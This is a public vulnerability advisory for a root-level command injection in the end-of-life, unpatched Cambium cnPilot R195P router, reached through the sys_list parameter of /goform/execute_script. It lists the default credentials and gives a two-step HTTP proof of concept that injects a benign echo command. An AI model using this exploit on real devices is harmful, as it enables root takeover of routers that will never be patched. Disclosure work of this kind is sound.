Public Vulnerability Disclosure - Unpatched Authenticated OS Command Injection in Cambium cnPilot R195P

Date: 2-16-2026
Reporter: Rose/prism131
Product: Cambium Networks cnPilot R195P
Vulnerability Type: OS Command Injection (CWE-78)
Severity: Critical
Status: EOL / UNPATCHED

A critical vulnerability exists in the web admin portal of CnPilot R195P routers. The application failed to properly sanitize a user input inside of the /goform/execute_script endpoint at parameter sys_list. This allows an attacker using default credentials (useradmin:admin, admin:admin, user:user) to inject arbitrary shell commands which are executed as root. The execute_script function is designed to execute system functions based on the sys_list* parameter. However, the handler passes this parameter directly to a system shell without proper sanitization or input validation. An attacker can modify system files, install malware, disable the device, or sniff traffic over the network. This device is End-of-Life, the vendor has been notified but no patch is expected. Immediate replacement or isolation of the device is recommended.

PoC:
```
Step 1: Obtaining Valid Session
POST /goform/websLogin HTTP/1.1
Host: [IP]
User-Agent: meow/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: [Length]

user_name=useradmin&password=admin

The response returns: Set-Cookie: ASPSSIONID=xyz...

Step 2: Arbitrary Shell Command Execution
Once the cookie is obtained, the following request triggers the execution
GET /goform/execute_script?sys_list=echo%20mrrp%20%3E%20meow.txt HTTP/1.1
Host: [IP]
Cookie: ASPSSIONID=[SESSION-ID]
User-Agent: Security-Audit/1.0
```
